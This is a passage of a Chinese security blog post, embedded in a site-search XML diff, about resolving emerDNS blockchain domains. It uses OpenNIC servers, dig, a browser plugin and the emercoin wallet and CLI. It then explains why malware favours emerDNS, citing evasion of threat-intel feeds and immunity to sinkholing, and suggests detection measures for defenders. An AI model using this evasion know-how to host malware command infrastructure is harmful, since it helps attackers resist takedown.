rel="noopener">servers.opennic.org</a>，从中抽取一个，设置本机dns为176.126.70.119，然后用浏览器访问我们前面设置的emerDNS域名<a href="magicming.lib">magicming.lib</a>，果然跳转到namecoin的官网，为优秀的自己点个赞，如下：</p><p><img src="/2019/04/emerdns/lib.jpg" alt="p"></p><h2 id="使用dig命令"><a href="#使用dig命令" class="headerlink" title="使用dig命令"></a>使用dig命令</h2><p>也可以用下面命令dig一下，通过应答的A记录能看出确实是前面设置的ip，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @176.126.70.119 magicking.lib</span><br></pre></td></tr></table></figure><p>应答如下：</p><p><img src="/2019/04/emerdns/dig.jpg" alt="p"></p><h2 id="使用浏览器插件"><a href="#使用浏览器插件" class="headerlink" title="使用浏览器插件"></a>使用浏览器插件</h2><p>访问<a href="https://peername.com/browser-extension/" target="_blank" rel="noopener">peername</a>，下载对应浏览器插件，我下载的是chrome版，安装后浏览器右上角多了一个地球图标，注意该插件和代理类插件冲突，顺利话就可以访问<a href="http://magicming.lib" target="_blank" rel="noopener">http://magicming.lib</a> 了，如下：<br><img src="/2019/04/emerdns/exten.jpg" alt="p"></p><h2 id="使用钱包内置的控制台"><a href="#使用钱包内置的控制台" class="headerlink" title="使用钱包内置的控制台"></a>使用钱包内置的控制台</h2><p>进入emerCoin钱包，打开 菜单—&gt; 帮助—&gt; 调试窗口—&gt; 控制台，输入help可查看所有命令，dns相关命令如下：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name_show <span class="built_in">[name</span>] [valuetype] [filepath]</span><br><span class="line">name_new <span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span> </span><span class="xml"><span class="tag">&lt;<span class="name">value</span>&gt;</span> </span><span class="xml"><span class="tag">&lt;<span class="name">days</span>&gt;</span> [toaddress] [valuetype]</span></span><br><span class="line"><span class="xml">name_update </span><span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span> </span><span class="xml"><span class="tag">&lt;<span class="name">value</span>&gt;</span> </span><span class="xml"><span class="tag">&lt;<span class="name">days</span>&gt;</span> [toaddress] [valuetype]</span></span><br><span class="line"><span class="xml">name_delete </span><span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>这里我们使用name_show命令查看magicming.lib的dns解析记录，命令如下：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name_show <span class="symbol">dns:</span>magicming.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure></p><p>返回记录如下，我们成功读取了A记录：<br><img src="/2019/04/emerdns/nameshow.jpg" alt="p"></p><h2 id="使用emercoin命令行"><a href="#使用emercoin命令行" class="headerlink" title="使用emercoin命令行"></a>使用emercoin命令行</h2><p>emerCoin官网提供了emercoin 命令行，支持ubuntu、debian、centos，下载地址<a href="https://emercoin.com/en/documentation/install-software/core-wallets/cli-daemon" target="_blank" rel="noopener">点这里</a>。<br><a href="https://maimeng.me">迈萌</a>我这里以ubuntu16为例，安装步骤如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-key adv --keyserver keyserver.ubuntu.com --recv B58C58F4</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> add-apt-repository <span class="string">'deb http://download.emercoin.com/ubuntu xenial emercoin'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt update &amp;&amp; apt -y install emercoin</span></span><br></pre></td></tr></table></figure><p>安装完毕后首先启动对应服务，命令如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service emercoind start</span><br></pre></td></tr></table></figure></p><p>然后服务在后台开始自动同步区块，同步期间试了下不能读取NVS。同步完成后，执行以下命令即可解析域名：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emc name_show <span class="symbol">dns:</span>magicming.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><h1 id="病毒爱上emerDNS的理由"><a href="#病毒爱上emerDNS的理由" class="headerlink" title="病毒爱上emerDNS的理由"></a>病毒爱上emerDNS的理由</h1><p>对比传统域名解析，我们能感受到emerDNS有以下优势：</p><ul><li><p>传统情报库不一定会收录这类非标准域名</p></li><li><p>emerDNS去中心化，无法通过ICANN成员单位来sinkhole该域名</p></li><li><p>emerDNS更健壮，更具有所有权</p></li><li><p>增大安全人员分析难度</p></li></ul><p>可以预测也正在发生，基于区块链的各种技术，会越来越多的用在传统黑产中。</p><h1 id="怎样防御emerDNS"><a href="#怎样防御emerDNS" class="headerlink" title="怎样防御emerDNS"></a>怎样防御emerDNS</h1><p>仅从监测感知层面来说，可以在情报库中加入以下数据，增强感知力：</p><ul><li>各种非标准域名后缀</li><li>可疑非标准域名对应的ip</li><li>openNIC DNS列表（用这个NDS的不是极客就是黑产）</li><li>……</li></ul><p>直接干掉emerDNS，目前没什么好想法。</p>]]></content>
+      
+      
       <categories>
-        <category>区块链安全</category>
+          
+          <category> 区块链安全 </category>
+          
       </categories>
-      <tags>
-        <tag>emerdns</tag>
-        <tag>emercoin</tag>
-        <tag>区块链DNS</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> emerdns </tag>
+            
+            <tag> emercoin </tag>
+            
+            <tag> 区块链DNS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
